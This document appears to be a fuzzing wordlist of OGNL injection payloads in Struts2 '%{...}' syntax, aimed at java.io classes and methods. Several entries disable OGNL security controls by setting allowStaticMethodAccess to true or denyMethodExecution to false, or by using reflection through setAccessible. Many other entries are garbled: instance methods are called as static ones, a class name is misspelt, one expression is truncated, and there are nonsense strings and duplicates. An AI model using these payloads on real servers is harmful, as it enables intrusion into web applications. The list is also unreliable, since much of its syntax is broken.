* %{#_memberAccess.allowStaticMethodAccess=true,#excludeProperties=@java.util.Collections@EMPTY_SET@java.io.FilteroutStream@close() }
* %{@java.io.FilterReader.reset() }
* %{@java.io.FilterWriter.close()}
* %{#context["xwork.MethodAccessor.denyMethodExecution"]=false ，@java.io.FilterWriter@available()}
* %{@java.io.InputStream.close() }
* %{#excludeProperties=@java.util.Collections@EMPTY_SET,@java.io.InputStreamReader.getEncoding()}
* %{@java.io.InputStreamReader.getEncoding() }
* %{@java.io.InputStreamReader.read()}
* %{#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.io.InputStreamReader@close()}
* %{@java.io.InputStreamReader.ready()}
* %{@java.io.LineNumberInputStream.getLineNumber()}
* %{#_memberAccess.allowStaticMethodAccess=true,@java.io.LineNumberReader@readLine()}
* %{@java.io.ObjectInputStream.readBoolean()}
* %{#a={"1,2,3",@java.io.ObjectInputStream.getField.defaulted(a)}}
* %{@java.io.ObjectOutputStream.defaultWriteObject()}
* %{@java.io.ObjectStreamClass.getName()}
* %{@java.io.ObjectStreamField.getOffset()}
* %{#a={"jygfjgjj",java.io.ObjectStreamField.isPrimitive(a)}}
* %{@java.io.PipedOutputStream.write(5)}
* %{#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@java.io.PrintStream@close()}
* %{@java.io.PrintStream.flush()}
* %{#a={"hello",java.io.PushbackInputStream.available(a)}}
* %{@java.io.PushbackReader.close()}
* %{@java.io.PushbackReader.ready() }
* %{#_memberAccess.allowStaticMethodAccess=true,@java.io.RandomAccessFile.close()}
* %{@java.io.Reader.close() }
* %{#a={"fawefwafw"}@java.io.StringReader.markSupported(a)}
* %{@java.io.StringWriter.flush()}
* %{#a={java.io.Writer.write("hello ") }}
* %{@java.io.BufferedInputStream}
* %{@java.io.BufferedOutputStream}
* %{@java.io.BufferedReader}
* %{@java.io.BufferedWriter}
* %{@java.io.ByteArrayInputStream}
* %{@java.io.ByteArrayOutputStream}
* %{@java.io.CharArrayReader}
* %{@java.io.CharArrayWriter}
* %{@java.io.Console}
* %{@java.io.DataInputStream}
* %{@java.io.DataOutputStream}
* %{@java.io.File}
* %{@java.io.FileDescriptor}
* %{@java.io.FileInputStream}
* %{@java.io.FileOutputStream}
* %{@java.io.FilePermission}
* %{@java.io.FileReader}
* %{@java.io.FileWriter}
* %{@java.io.FilterInputStream}
* %{@java.io.FilterOutputStream}
* %{@java.io.FilterReader}
* %{@java.io.FilterWriter}
* %{@java.io.InputStream}
* %{@java.io.InputStreamReader}
* %{@java.io.LineNumberInputStream}
* %{@java.io.LineNumberReader}
* %{@java.io.ObjectInputStream}
* %{@java.io.ObjectInputStream.GetField}
* %{@java.io.ObjectOutputStream}
* %{@java.io.ObjectOutputStream.PutField}
* %{@java.io.ObjectStreamClass}
* %{@java.io.ObjectStreamField}
* %{@java.io.OutputStream}
* %{@java.io.OutputStreamWriter}
* %{@java.io.PipedInputStream}
* %{@java.io.PipedOutputStream}
* %{@java.io.PipedReader}
* %{@java.io.PipedWriter}
* %{@java.io.PrintStream}
* %{@java.io.PrintWriter}
* %{@java.io.PushbackInputStream}
* %{@java.io.PushbackReader}
* %{@java.io.RandomAccessFile}
* %{@java.io.Reader}
* %{@java.io.SequenceInputStream}
* %{@java.io.SerializablePermission}
* %{@java.io.StreamTokenizer}
* %{@java.io.StringBufferInputStream}
* %{@java.io.StringReader}
* %{@java.io.StringWriter}
* %{@java.io.Writer}
* %{new java.io.BufferedInputStream().close()}
* %{new java.io.BufferedOutputStream().flush()}
* %{new java.io.BufferedReader().lines()}
* %{new java.io.BufferedWriter().newLine()}
* %{new java.io.ByteArrayInputStream().mark()}
* %{new java.io.ByteArrayOutputStream().}
* %{new java.io.CharArrayReader().buf()}
* %{new java.io.CharArrayWriter().buf()}
* %{new java.io.Console().readPassword()}
* %{new java.io.DataInputStream().readLine()}
* %{new java.io.DataOutputStream().flush()}
* %{new java.io.FileDescriptor().sync()}
* %{new java.io.FileInputStream().getFD()}
* %{new java.io.FileOutputStream().flush}
* %{new java.io.FilePermission().hashCode()}
* %{new java.io.LineNumberInputStream().getLineNumber()}
* %{new java.io.LineNumberReader().getLineNumber()}
* %{new java.io.PipedInputStream().receive(a)}
* %{new java.io.PipedOutputStream().connect(a)}
* %{new java.io.PipedReader().ready()}
* %{new java.io.RandomAccessFile().commentChar(ch)}
* %{new java.io.StreamTokenizer().commentChar(ch)}
* %{@java.io.FileDescriptor}
* %{@java.io.FileDescriptor@sync()}
* %{@java.io.FileInputStream}
* %{@java.io.FileInputStream@getChannel()}
* %{@java.io.FileInputStream@getFD()}
* %{@java.io.FileInputStream@read(byte[] b, int off, int len)}
* %{@java.io.FileOutputStream}
* %{@java.io.FileOutputStream@write(byte[] b, int off, int len)}
* %{@java.io.FilePermission}
* %{@java.io.FilePermission@getActions()}
* %{@java.io.FilePermission@newPermissionCollection()}
* %{@java.io.Console}
* %{@java.io.Console@flush()}
* %{@java.io.Console@readLine(String fmt, Object...args)}
* %{@java.io.Console@readPassword(String fmt, Object... args)}
* %{@java.io.Console@reader()}
* %{@java.io.Console@writer()}
* %{@java.io.DataInputStream}
* %{@java.io.DataInputStream@read(byte[] b, int off, int len)}
* %{@java.io.DataInputStream@readFully(byte[] b, int off, int len)}
* %{@java.io.DataInputStream@readUTF(DataInput in)}
* %{@java.io.DataOutputStream}
* %{@java.io.DataOutputStream@write(byte[] b, int off, int len)}
* %{@java.io.DataOutputStream@writeUTF(String str)}
* %{@java.io.FileReader}
* %{@java.io.FileWriter}
* %{@java.io.Reader}
* %{@java.io.Reader@read(char[] cbuf, int off, int len)}
* %{@java.io.Writer}
* %{@java.io.Writer@append(CharSequence csq)}
* %{@java.io.Writer@write(char[] cbuf, int off, int len)}
* %{@java.io.SerializablePermission}
* %{@java.io.RandomAccessFile}
* %{@java.io.RandomAccessFile@getFilePointer()}
* %{@java.io.RandomAccessFile@read(byte[] b, int off, int len)}
* %{@java.io.RandomAccessFile@readFully(byte[] b, int off, int len)}
* %{@java.io.RandomAccessFile@write(byte[] b, int off, int len)}
* %{@java.io.RandomAccessFile@readUTF()}
* %{@java.io.RandomAccessFile@writeUTF(String str)}
* %{@java.io.PipedReader}
* %{@java.io.PipedReader@connect(PipedWriter src)}
* %{@java.io.PipedReader@read(char[] cbuf, int off, int len)}
* %{@java.io.PipedWriter}
* %{@java.io.PipedWriter@connect(PipedReader snk)}
* %{@java.io.PipedWriter@write(char[] cbuf, int off, int len)}
* %{@java.io.BufferedInputStream}
* %{@java.io.BufferedInputStream@read(byte[] b, int off, int len)}
* %{@java.io.BufferedOutputStream}
* %{@java.io.BufferedOutputStream@write(byte[] b, int off, int len)}